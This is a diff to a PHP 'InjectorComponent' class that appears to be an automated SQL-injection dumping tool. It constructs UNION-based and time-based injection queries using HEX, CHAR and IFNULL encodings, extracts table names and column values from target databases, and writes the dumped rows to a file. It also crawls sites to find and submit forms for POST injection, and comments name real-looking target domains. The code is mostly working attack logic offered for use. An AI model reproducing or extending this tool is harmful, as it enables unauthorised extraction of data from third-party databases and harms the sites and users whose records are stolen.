@@ -255,7 +255,8 @@ class InjectorComponent {
 			{	
 				//$this->d($key,'name CLEAN ');
 		
-				$tmp.=$key.'='.rawurlencode($val).'&';	
+                $tmp.=$key.'='.rawurlencode($val).'&';	
+				//$tmp.=$key.'='.$val.'&';	
 				$tmp22.=$key.'='.$val.'&';	
 			}
 			else
@@ -263,7 +264,8 @@ class InjectorComponent {
 				$this->key_sqli=$key;
 				
 				//$this->d($key,'name WHERE SQLI ');
-				$tmp.=$name.'='.($url?rawurlencode($value):$value).'&';
+                $tmp.=$name.'='.($url?rawurlencode($value):$value).'&';
+				//$tmp.=$name.'='.$value.'&';
 				$tmp22.=$name.'='.($url?$value:$value).'&';
 			}	
 	   }
@@ -536,7 +538,7 @@ class InjectorComponent {
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
+					if(is_array($order) AND count($pole)>1)
 					{
 						$query_mssql .= $zap."".$order[0];
 					}else
@@ -550,20 +552,20 @@ class InjectorComponent {
 			//if($this->debug==true){$this->d($query_mssql,'$query_mssql');}
 			
 	
-			//if($order!==array() AND count($pole)>1)
-			//{
-				//$order = '+order+by+`'.$order[0].'`+'.$order[1].'+';
-			//}else
-			//{
-			//	$order = '';
-			//}
+			if(is_array($order) AND count($pole)>1)
+			{
+				$order = '+order+by+`'.$order[0].'`+'.$order[1].'+';
+			}else
+			{
+				$order = '';
+			}
 			
 			
 				
 			
 				if($this->desc ==0 AND $this->desc_enable == true)
 				{
-					$order = 'ORDER by id DESC';
+					//$order = 'ORDER by id DESC';
  					
 					//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.''.$k;
 					
@@ -1560,7 +1562,7 @@ class InjectorComponent {
 			{
 				
 				$mysql = explode(',', $mysql['concat(cast(group_concat(table_name) as char))']);
-				$this->d('mysql TRUE bd');
+				//$this->d('mysql TRUE bd');
 			
 				return $mysql;
 			
@@ -1757,25 +1759,58 @@ class InjectorComponent {
 	}
 	
 	
-	
-	
 	function mysqlGetValue($bd,$table,$pole,$limit=0,$order=array(),$where=''){
 		
 			if($this->method_hex ==true  AND $this->method_auto ==false){
+               
 				$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
-				return $data;
+                
+                $out = array_keys($data); 
+                
+                  if(trim($data[$out[0]])!='' AND count($data) >0)
+                    {
+                       $this->method_hex = true;
+                       
+                        //$this->d('!!!method_hex!!!!');
+                        return $data;
+                
+                    }
 			}
+           
 			
 			
 			if($this->method_char ==true AND $this->method_auto ==false){
 				$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
-				return $data;
+               
+                
+                $out = array_keys($data); 
+                
+                  if(trim($data[$out[0]])!='' AND count($data) >0)
+                    {
+                        
+                        //$this->d('!!!method_CHAR!!!!');
+                        $this->method_char = true;
+                        return $data;
+                    }
+                
+                
+				
 			}
 			
 			
 			if($this->method_ifnull ==true AND $this->method_auto ==false){
 				$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
-				return $data;
+                
+                $out = array_keys($data); 
+                
+                 if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
+                    {
+                        
+                        //$this->d('!!!method_ifNULL!!!!');
+                        $this->method_ifnull=true;
+                        return $data;
+                
+                    }
 			}
 			
 			
@@ -1784,18 +1819,108 @@ class InjectorComponent {
 			
 				
 				
-				if($this->method_hex ==true){
+				if($this->method_hex ==true)
+                {
 					
-					$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
+				    $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
+                    
+                    
+                    $out = array_keys($data); 
+						
+                        
+                    if(count($data)==0 or  trim($data[$out[0]])=='')
+                    {
+                        
+                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
+                        
+                        $out = array_keys($data);
+                        
+                         
+                        if(count($data)==0 or  trim($data[$out[0]])=='')
+                        {
+                                $data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
+                                
+                                $out = array_keys($data);
+                                
+                                if(count($data)==0 or  trim($data[$out[0]])=='')
+                                {
+                                    $this->method_hex = true;
+                                    return $data;
+                                }else{
+                                   
+                                    $this->method_ifnull = true;
+                                    return $data;
+                                }	
+                                
+                        }else{
+                            
+                             //$this->d('!!!method_char AUTO!!!!');
+                             
+                             $this->method_char =true;
+                             return $data;
+                        }
+                        
+                    }else{
+                        //$this->d('!!!method_hex AUTO!!!!');
+
+                        $this->method_hex = true;
+                        return $data;
+                    }
+                        
+                        
+                    return $data;
+                  
+                    
 				}elseif($this->method_ifnull==true)
 				{
 					$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
 					
-					if($data[0] !='' AND count($data)==0)
-						{
-							$this->method_char = true;
-							return $data;
-						}
+					 $out = array_keys($data); 
+						
+                        
+                    if(count($data)==0 or  trim($data[$out[0]])=='')
+                    {
+                        
+                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
+                        
+                        $out = array_keys($data);
+                        
+                         
+                        if(count($data)==0 or  trim($data[$out[0]])=='')
+                        {
+                                $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
+                                
+                                $out = array_keys($data);
+                                
+                                if(count($data)==0 or  trim($data[$out[0]])=='')
+                                {
+                                    $this->method_ifnull = true;
+                                    return $data;
+                                }else{
+                                  
+                                    
+                                    $this->method_hex = true;
+                                    return $data;
+                                }	
+                                
+                        }else{
+                            
+                             //$this->d('!!!method_char AUTO!!!!');
+                             
+                             $this->method_char =true;
+                             return $data;
+                        }
+                        
+                    }else{
+                        //$this->d('!!!method_hex AUTO!!!!');
+
+                         $this->method_ifnull = true;
+                        return $data;
+                    }
+                        
+                        
+                    return $data;
+						
 					
 				}else
 				{
@@ -1803,35 +1928,89 @@ class InjectorComponent {
 					
 					if($this->method_char ==true)
 					{
-						$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
+                        $data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
 						
-						if($data[0] !='' AND count($data)==0)
-						{
-							$this->method_char = true;
-							return $data;
-						}
+                      
+                      
+					
+                        $out = array_keys($data); 
 						
+                        
+                        if(count($data)==0 or  trim($data[$out[0]])=='')
+                        {
+                            
+                             $data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
+                            
+                            $out = array_keys($data);
+                            
+                             
+                            if(count($data)==0 or  trim($data[$out[0]])=='')
+                            {
+                                    $data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
+                                    
+                                    $out = array_keys($data);
+                                    
+                                    if(count($data)==0 or  trim($data[$out[0]])=='')
+                                    {
+                                        $this->method_char =true;
+                                        return $data;
+                                    }else{
+                                      
+                                        
+                                        $this->method_hex = true;
+                                        return $data;
+                                    }	
+                                    
+                            }else{
+                                
+                                 //$this->d('!!!method_char AUTO!!!!');
+                                 
+                                  $this->method_ifnull = true;
+                                 return $data;
+                            }
+                            
+                        }else{
+                            //$this->d('!!!method_hex AUTO!!!!');
+
+                                $this->method_char =true;
+                                return $data;
+                        }
+                            
+                        
+                        return $data;
+
 					}
 					
-				
+				   
 					
 					
-					if($data[0]=='' AND count($data)==0)
+					if(count($data)==0 or  trim($data[$out[0]])=='')
 					{
 						
 						$data = $this->mysqlGetValueHEX($bd,$table,$pole,$limit,$order,$where);
 						
+                        
+                        //$this->d($data,'$data$data$data');
+                        
+                       
+                        $out = array_keys($data); 
 						
-						if($data[0] =='' AND count($data)==0)
+                        
+						if(count($data)==0 or  trim($data[$out[0]])=='')
 						{
 							
 							$data = $this->mysqlGetValueCHAR($bd,$table,$pole,$limit,$order,$where);
+                            
+                            $out = array_keys($data);
 							
-							if($data[0] =='' AND count($data)==0)
+                             
+							if(count($data)==0 or  trim($data[$out[0]])=='')
 							{
 									$data = $this->mysqlGetValueIFNULL($bd,$table,$pole,$limit,$order,$where);
 									
-									if($data[0] =='' AND count($data)==0)
+                                    $out = array_keys($data);
+                                    
+									if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
 									{
 										$this->method_hex = true;
 									}else{
@@ -1839,15 +2018,16 @@ class InjectorComponent {
 									}	
 									
 							}else{
-								$this->method_char =true;
+                                 //$this->d('!!!method_char AUTO CHAR!!!!');
+								 $this->method_char =true;
 							}
 							
 						}else{
+                             //$this->d('!!!method_hex AUTO HEX!!!!');
+                            
 							$this->method_hex = true;
 						}
-							
-						
-							
+								
 					}
 				}
 				
@@ -1857,11 +2037,13 @@ class InjectorComponent {
 		
 	}
 	
+	
+	
 	function mysqlGetValueHEX($bd,$table,$pole,$limit=0,$order=array(),$where=''){//общая функция для MYSQL через HEX с sqli dumper
 		
 
 		
-		
+		//$this->d($order,'$order!');
 	
 		
 		
@@ -2026,20 +2208,30 @@ class InjectorComponent {
 		 $give = 0;
 		 
 		
-		 
-		 if($order!==array() AND count($pole)>1)
+		
+			
+			
+		//if($this->desc ==0 AND $this->desc_enable == true)
+			//{	
+				//$order2 = 'ORDER+by+id+DESC';
+			//}
+            
+        if(is_array($order) AND count($pole)>1 and $order[0] !='')
 			{
-				$order2 = '+order+by+`'.$order[0].'`+'.$order[1].'+';
-			}else
+				$order2 = '+order+by+`'.$order[0].'`+DESC+';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = '+order+by+'.$order.'+DESC+';
+            }else
 			{
 				$order2 = '';
 			}
-			
-			
-		if($this->desc ==0 AND $this->desc_enable == true)
-			{	
-				$order2 = 'ORDER+by+id+DESC';
-			}
+		     
+            
+            
+            
 			
 			
 		 
@@ -2061,21 +2253,18 @@ class InjectorComponent {
 					
 					$query .= $zap."(select+CONCAT($hh,$zapr,$hh)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit.')';
 					
-					
+					 //$this->d($query ,'$query  11111111');
 					
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
-					{
-						$query .= $zap."".$order[0];
-					}else
-					{
+					
 						$query .= $zap.$col;	
-					}
-				}	
+                               
+				}
 			}
-			
+               // $this->d($query ,'$query 2222222');
+            //  exit;
 				
 				if($this->debug==true){$this->d($query,'$query mysqlGetValueHEX');}
 				#exit;
@@ -2332,20 +2521,27 @@ class InjectorComponent {
 		 $give = 0;
 		 
 		 
-		 if($order!==array() AND count($pole)>1)
+		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
 			{
-				$order2 = '+order+by+`'.$order[0].'`+'.$order[1].'+';
-			}else
+				$order2 = '+order+by+`'.$order[0].'`+DESC+';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = '+order+by+'.$order.'+DESC+';
+            }else
 			{
 				$order2 = '';
 			}
+		     
 		 
 		 
-			if($this->desc ==0 AND $this->desc_enable == true)
-			{
-				$order2 = 'ORDER+by+id+DESC';
+		 
+			//if($this->desc ==0 AND $this->desc_enable == true)
+			//{
+			//	$order2 = 'ORDER+by+id+DESC';
 				//запрос целиком
-			}
+			//}
 		 
 		 //подставляем колонки
 		 for($col=1;$col<=$this->column;$col++)
@@ -2366,13 +2562,9 @@ class InjectorComponent {
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
-					{
-						$query .= $zap."".$order[0];
-					}else
-					{
-						$query .= $zap.$col;	
-					}
+					
+					$query .= $zap.$col;	
+					
 				}	
 			}
 			
@@ -2602,20 +2794,25 @@ class InjectorComponent {
 		 $give = 0;
 		 
 		 
-		 if($order!==array() AND count($pole)>1)
+		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
 			{
-				$order2 = '+order+by+`'.$order[0].'`+'.$order[1].'+';
-			}else
+				$order2 = '+order+by+`'.$order[0].'`+DESC+';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = '+order+by+'.$order.'+DESC+';
+            }else
 			{
 				$order2 = '';
 			}
 		 
 		 
-			if($this->desc ==0 AND $this->desc_enable == true)
-			{
-				$order2 = 'ORDER+by+id+DESC';
+			//if($this->desc ==0 AND $this->desc_enable == true)
+			//{
+				//$order2 = 'ORDER+by+id+DESC';
 				//запрос целиком
-			}
+			//}
 		 
 		 //подставляем колонки
 		 for($col=1;$col<=$this->column;$col++)
@@ -2639,17 +2836,13 @@ class InjectorComponent {
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
-					{
-						$query .= $zap."".$order[0];
-					}else
-					{
-						$query .= $zap.$col;	
-					}
+					
+					$query .= $zap.$col;	
+					
 				}		
 					
 					
-					
+					//$this->d($query,'$query');
 					//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
 					
 					//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
@@ -2657,7 +2850,7 @@ class InjectorComponent {
 				//}else
 				//{
 						
-					//if($order!==array() AND count($pole)>1)
+					//if(is_array($order) AND count($pole)>1)
 					//{
 					//	$query .= $zap."".$order[0];
 					//}else
@@ -2795,7 +2988,7 @@ class InjectorComponent {
 	
 	
 	
-	function mysqlGetAllValue($bd,$table,$needle,$count=0,$order=array(),$where=''){//Получение всех результатов
+	function mysqlGetAllValue($bd,$table,$needle,$count=0,$order=array(),$where='',$file=false){//Получение всех результатов
 		
 			
 		//$this->d($count,'$count1');	
@@ -2810,7 +3003,23 @@ class InjectorComponent {
 		{	
 			for($i=0;$i<$count;$i++)
 			{
-				$new[] =  $this->mysqlGetValue($bd,$table,$needle,$i,$order,$where);
+                
+                $kk = $this->mysqlGetValue($bd,$table,$needle,$i,$order,$where);
+				$new[] =  $kk;
+                
+                
+                if($file !='')
+                {
+                    $fh = fopen($file, "a+");
+  
+                    $col_str = implode(';',$kk);
+                    
+                    fwrite($fh, trim($col_str)."\n");
+                   // $this->d($kk,'$kk');
+                
+                    fclose($fh);
+                }
+                
 				//$this->d($new,'new');
 					//return $new;	
 			}
@@ -3131,7 +3340,7 @@ class InjectorComponent {
 
 				preg_match_all('/\[X\](.*?)\[X\]/',$file,$arr);
 				
-				
+				//$this->d($file,'arrr');
 				if($this->debug==true){	$this->d($arr,'mysqlGetCountInsert ARR');}
 				
 				
@@ -3142,7 +3351,9 @@ class InjectorComponent {
 	
 	
 	
-	function mysqlGetValueSleep($bd,$table,$pole,$limit=0,$order=array(),$where=''){
+    
+    
+	function mysqlGetValueSleep_old($bd,$table,$pole,$limit=0,$order=array(),$where=''){
 		
 			if($this->method_hex ==true  AND $this->method_auto ==false){
 				$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
@@ -3220,6 +3431,143 @@ class InjectorComponent {
 		
 	}
 	
+   
+    
+    
+    function mysqlGetValueSleep($bd,$table,$pole,$limit=0,$order=array(),$where=''){
+		
+			if($this->method_hex ==true  AND $this->method_auto ==false){
+               
+				$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
+                
+                $out = array_keys($data); 
+                
+                  if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
+                    {
+                       $this->method_hex = true;
+                        return $data;
+                
+                    }
+			}
+			
+			
+			if($this->method_char ==true AND $this->method_auto ==false){
+				$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
+               
+                
+                $out = array_keys($data); 
+                
+                if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
+                    {
+                        $this->method_char = true;
+                        return $data;
+                    }
+                
+                
+				
+			}
+			
+			
+			if($this->method_ifnull ==true AND $this->method_auto ==false){
+				$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
+                
+                $out = array_keys($data); 
+                
+                 if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
+                    {
+                        $this->method_ifnull=true;
+                        return $data;
+                
+                    }
+			}
+			
+			
+			if($this->method_auto ==true)
+			{
+			
+				
+				
+				if($this->method_hex ==true){
+					
+				    $data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
+                    
+                    return $data;
+                    
+				}elseif($this->method_ifnull==true)
+				{
+					$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
+					
+					return $data;
+						
+					
+				}else
+				{
+					
+					
+					if($this->method_char ==true)
+					{
+						$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
+						
+                      
+                        return $data;
+
+					}
+					
+				   
+					
+					
+					if(($data[0]=='' AND count($data)==0) or trim($data[$out[0]])=='' )
+					{
+						
+						$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
+						
+                       
+                        $out = array_keys($data); 
+                        
+                        
+						
+                        
+						if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
+						{
+							
+							$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
+                            
+                            $out = array_keys($data);
+							
+                             
+							if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
+							{
+									$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
+									
+                                    $out = array_keys($data);
+                                    
+									if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
+									{
+										$this->method_hex = true;
+									}else{
+										$this->method_ifnull = true;
+									}	
+									
+							}else{
+								$this->method_char =true;
+							}
+							
+						}else{
+							$this->method_hex = true;
+						}
+								
+					}
+				}
+				
+				
+				return $data;
+			}
+		
+	}
+	
+    
+    
+    
 	function mysqlGetValueSleepCHAR($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
 		
 		
@@ -3295,13 +3643,18 @@ class InjectorComponent {
 		//else{
 		
 		
-		if($order!==array() AND count($pole)>1)
-		{
-			$order2 = ' order by `'.$order[0].'` '.$order[1].' ';
-		}else
-		{
-			$order2 = ' ';
-		}
+		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
+			{
+				$order2 = ' order by `'.$order[0].'` DESC ';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = ' order by '.$order.' DESC ';
+            }else
+			{
+				$order2 = ' ';
+			}
 		
 		 //подставляем колонки
 		 for($col=1;$col<=$this->column;$col++)
@@ -3321,13 +3674,9 @@ class InjectorComponent {
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
-					{
-						$query .= $zap."".$order[0];
-					}else
-					{
-						$query .= $zap.$col;	
-					}
+					
+					$query .= $zap.$col;	
+					
 				}
 					
 			}
@@ -3497,19 +3846,23 @@ class InjectorComponent {
 		//}
 		//else{
 		
-		 if($order!==array() AND count($pole)>1)
+		if(is_array($order) AND count($pole)>1 and $order[0] !='')
 			{
-				$order2 = ' order by `'.$order[0].'` '.$order[1].' ';
-			}else
+				$order2 = ' order by `'.$order[0].'` DESC ';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = ' order by '.$order.' DESC ';
+            }else
 			{
-				$order2 = '';
+				$order2 = ' ';
 			}
 			
-			
-		if($this->desc ==0 AND $this->desc_enable == true)
-			{	
-				$order2 = 'ORDER by id DESC';
-			}
+		//if($this->desc ==0 AND $this->desc_enable == true)
+			//{	
+				//$order2 = 'ORDER by id DESC';
+		//	}
 			
 		
 		
@@ -3537,13 +3890,9 @@ class InjectorComponent {
 				}else
 				{
 						
-					if($order!==array() AND count($pole)>1)
-					{
-						$query .= $zap."".$order[0];
-					}else
-					{
-						$query .= $zap.$col;	
-					}
+					
+					$query .= $zap.$col;	
+					
 				}
 					
 			}
@@ -3670,6 +4019,259 @@ class InjectorComponent {
 
 	}
 	
+	function mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
+		
+		
+		if($table!=='')
+		{
+			if($bd=='')
+			{
+				$from = 'FROM '.$table.'';
+			}else
+			{
+				$from = 'FROM '.$bd.'.'.$table.'';
+			}
+		}else
+		{
+			$from = '';
+		}
+		
+		 
+		$method = $this->sposob;
+		
+		//начало лимита
+		$limit = $limit.',1';
+		
+		$query = "";//начальный запрос для sleep
+		
+		$k = $this->set['sleep']['coment'];
+		
+		
+		
+		
+		if(empty($k) or $k=='')
+		{	
+			//$this->d('tochka: emtpry(k) ');
+			//return false;
+		}
+			 
+		 if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
+		
+		 $zapr = '';//общая строка для наших полей
+		 
+		
+		 
+		//обволакиваем его спец символами, чтобы патом найти можно было бы
+		foreach ($pole as $key=>$val)
+		{
+	  	
+		 	if(count($pole)==1)//если одно поле
+			{
+				
+				//  $zapr .= "0x5e,IFNULL(cast($val as char),' '),0x5e,";
+				$zapr .= "IFNULL(cast($val as char),' ')";
+				//$zapr .= "IFNULL(cast($val as char),0x20)";
+		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
+		 		
+		 	}else
+			{//если несколько найти надо
+				//$zapr .= "0x5e,unhex(Hex(cast($val as char))),0x5e,";
+				$zapr .= "0x5e,IFNULL(cast($val as char),' '),0x5e,";
+                //$zapr .= "0x5e,IFNULL(unhex(Hex(cast($val as char))),' '),0x5e,";
+				//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
+		 	}
+		}
+	  
+		//$this->d('tochka: $zapr '. $zapr);
+		//exit;
+		
+		 $work_count = count($this->work);//рабочие поля где вывод есть
+		
+		//$this->d($this->work,'$work_count');
+		//exit;
+		
+		 $new = array(); // Что на выход
+		 $give = 0;
+		 
+		
+		//if($this->dumpfile==true)
+		//{
+			//$query = $zapr;
+		//}
+		//else{
+		
+		if(is_array($order) AND count($pole)>1 and $order[0] !='')
+			{
+				$order2 = ' order by `'.$order[0].'` DESC ';
+               
+                
+			}elseif(!is_array($order) and $order !=''){
+                
+                $order2 = ' order by '.$order.' DESC ';
+            }else
+			{
+				$order2 = ' ';
+			}
+			
+		//if($this->desc ==0 AND $this->desc_enable == true)
+			//{	
+				//$order2 = 'ORDER by id DESC';
+		//	}
+			
+		
+		
+		
+		 //подставляем колонки
+		 for($col=1;$col<=$this->column;$col++)
+			{
+				
+				if($col==1){$zap='';}else{$zap=',';}//запятая
+			
+				if(in_array($col, $this->work) AND $give==0)
+				{
+					$p = $col-1;
+
+					$give++;
+					
+					
+					$hh = $this->strtohex('[ddd]');
+					
+					$query .= $zap."(select CONCAT($hh,$zapr,$hh)".' '.$from.' '.$where.' '.$order2.' limit '.$limit.')';
+					
+					
+					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
+					
+				}else
+				{
+						
+					
+					$query .= $zap.$col;	
+					
+				}
+					
+			}
+		//}	
+			//$this->d($query,'$query');
+			//exit;
+	
+		
+
+				$q = $query.' ';
+				$q = str_replace(',,', ',',$q);
+				$q = str_replace('  ', ' ',$q);
+				
+			
+				
+				//$this->set['sleep']['hex']=true;
+				
+				
+				//$sss = $this->mysqlDumperFilter('SEleCT '.$q);
+				
+				$file = $this->send_sql('SEleCT '.$q,false);
+				//exit;
+				
+				if($this->head_enable==true){
+					
+					file_put_contents('./file_sleepHEX_head_hex.txt',$file);
+				}else{
+					file_put_contents('./file_sleepHEX.txt',$file);
+				}
+				
+				
+				
+				//$this->d($q,'$q');
+				
+				//$this->d($file,'$file');	
+				
+				//$this->d('tochka: send_sql-  '.'SEleCT '.$q);
+				
+				
+				$this->file = $file;
+				
+				if($this->dumpfile==true)
+				{
+					
+					//return $file;
+		
+				}
+				
+
+			
+				
+				//ищем результаты	
+				if(count($pole)==1) //если он один предполагается
+				{
+					//preg_match_all("/\[X\](.*?)\[XX\]/is",$file,$arr);
+					  preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
+					//$this->d($arr[1][0],'$arr[1][0]');
+
+					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
+					
+					return false;
+		 		
+				}else//если не сколько полей было
+				{
+		 				
+						preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
+						
+						//preg_match_all("~\^(.*?)\^~is",$arr22[0],$arr);
+						
+						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
+						
+						//$this->d($arr,'arrA_LLL POLE HEX');
+						
+						
+							
+						
+					$j=1;
+					
+					foreach ($pole as $val)
+					{
+						
+						
+						
+						
+						
+				
+						if(isset($arr[1][0]))
+						{
+							
+							$arr[1][0] = str_replace('^^','^',$arr[1][0]);
+							
+							$b = explode('^',$arr[1][0]);
+							
+							$b_bew = array_filter($b, function($element) {
+								return !empty($element);
+							});
+							
+							
+							//$this->d($b,'b');
+							//$this->d($b_bew,'b_new');
+							
+							$export[$val] = $b[$j];
+						}else
+						{
+							$export[$val] = '';
+					
+
+						}
+						
+						$j++;
+						
+					}
+				}
+			
+			
+			
+				if(isset($export))
+				{	
+					return $export;
+				}
+				
+				return false;
+		
+
+	}
 	
 	
 	
@@ -4254,6 +4856,9 @@ class InjectorComponent {
 		//$value = 'http://toyshop.se';
 		
 		//$value="anykstenai.lt";
+        
+        
+        //$value = 'https://my.tsianalytics.com/';
 		
 		$this->d($value,'crowler');
 		
@@ -4340,9 +4945,13 @@ class InjectorComponent {
 			$this->l1_main_form = array_unique($this->l1_main_form);
 			$this->l1_main_form = array_slice($this->l1_main_form, 0, $this->l1_main_form_slice);
 			
-			$this->d($this->l1_main_form,'links_pars для FORMS!!!');
 			
 			
+			$this->l1_main_form = array_unique($this->l1_main_form);
+            
+            $this->d($this->l1_main_form,'links_pars для FORMS!!!');
+            
+            
 			
 			
 			if(count($this->l1_main_form) > 0)
@@ -4378,9 +4987,13 @@ class InjectorComponent {
 					if($razn>$this->time2){$this->d('TIME!!!! ALL');return false;}
 					
 					
-					$forms_all = $this->form_search($con);
+                    //$con = 'https://my.tsianalytics.com/lang/ru';
+                    
+					$this->form_search($con);
 				
-					//$this->d($forms_all,'$forms_all');
+                    unset($this->global_form[0]);
+                
+					$this->d($this->global_form,'$this->global_form');
 					//exit;
 				
 					
@@ -4389,7 +5002,7 @@ class InjectorComponent {
 					
 					if($this->post_check==true)
 					{
-						$form_ku = $this->form_start($forms_all,$links_form_check);
+						$form_ku = $this->form_start($this->global_form,$links_form_check);
 						
 						//if($form_ku == true){
 							//return $form_ku;
@@ -5110,7 +5723,7 @@ class InjectorComponent {
 		//получаем страницу где формы находяться, обычная загрузка страницы
 		
 		
-		$forms_all = array_unique($forms_all);
+		//$forms_all = array_unique($forms_all);
 		
 		
 		$this->p = rand(10000,99999);
@@ -5146,11 +5759,14 @@ class InjectorComponent {
 			$str ='';
 			
 			//	редактируем пост формат под себя ВЫДЕЛЯЕМ ACTION И INPUT
+            
+            $this->d($forms,'form orig');
+            
 			$form_post_data  = $this->form_post_data($forms);
 			$this->form_set['form_post_data'] = $form_post_data['post'];
 			$this->form_set['form_post_act'] = $form_post_data['act'];
 			$this->d($form_post_data,'$form_post_data !!!!');
-			//exit;
+			
 			$this->form_set['form_post_act'] = str_replace('www.','',$this->form_set['form_post_act']);
 			
 			if(isset($this->forms_done[$this->form_set['form_post_act']]))
@@ -5176,7 +5792,7 @@ class InjectorComponent {
 			$this->form_set['form_page_full_query'] = $form_page_full_query;
 			$this->d($form_page_full_query,'form_page_full_query');
 			
-			
+			exit;
 			$check_new = 'post::'.$form_page_full_query;
 			
 			
@@ -5297,20 +5913,29 @@ class InjectorComponent {
 					
 					foreach($form_one["buttons"] as $bbb){
 						
-						
+						$this->d($bbb,'$bbb');
 						$bbb = str_replace('?', '', $bbb);
 						
+                        if($bbb['name']==''){
+                            
+                            $bbb['name'] = 'buttons';
+                        }
+                        
 						$bbb_new[$bbb['name']]=$bbb;
 						
 					}
 					
-					//$this->d($bbb_new,'$bbb_new');
-					//exit;
+					
 					
 					$tmpall = array();
 				
 					$tmpall = array_merge($form_one["form_elemets"],$bbb_new);
 					
+                    $this->d($tmpall,'$tmpall');
+                    //$this->d($bbb_new,'$bbb_new');
+					//exit;
+                    
+                    
 					$form_post_data = array('act'=>$new_act,'post'=>$tmpall);
 					
 					
@@ -5341,7 +5966,7 @@ class InjectorComponent {
 		foreach($postdata as $pp=>$value)
 		{
 			
-				//$this->d($value,'$value');
+				$this->d($value,'$value');
 		
 				$r = $this->str_rand();
 				$this->r = $r;
@@ -5361,8 +5986,11 @@ class InjectorComponent {
 					
 				}else
 				{
-					//$this->d($pp,'$pp');
+					$this->d($value,$pp);
 					
+                   
+                    
+                    
 					if(preg_match('/name/i',$pp,$math))
 					{
 						
@@ -5404,9 +6032,9 @@ class InjectorComponent {
 						$str.=$pp.'=198211'.$this->p.'&';
 					}else{
 						
+                        if($pp !=''){$str.=$pp.'='.$value['value']."&";}else{$str.=$value['name'].'='.$value['value']."&";}
 					
-					
-						$str.=$pp.'=9999999&';
+						//$str.=$pp.'=9999999&';
 						
 						
 					}
@@ -5552,9 +6180,9 @@ class InjectorComponent {
 				
 				if(count($form_in)>0)
 				{
+					//$this->d('kuku');
 					
-					
-					$fff[] = $form_in;
+					$this->global_form[] = $form_in;
 				}else{
 					
 				}
@@ -6639,8 +7267,12 @@ class InjectorComponent {
 			
 			$url2 = str_replace(array("'",'"','\\'),'',$url2);
 			
-			$this->d($url2,'SQLI ORIG');
-			
+            if($this->proxy_no_check){
+            
+            }else{
+            
+                $this->d($url2,'SQLI ORIG');
+            }
 			
 		}else{
 			
@@ -6674,8 +7306,14 @@ class InjectorComponent {
 		
 		
 			/////Поиск явных ошибок//////
-		$this->d($url,'url AFTER inj_test_get_head');
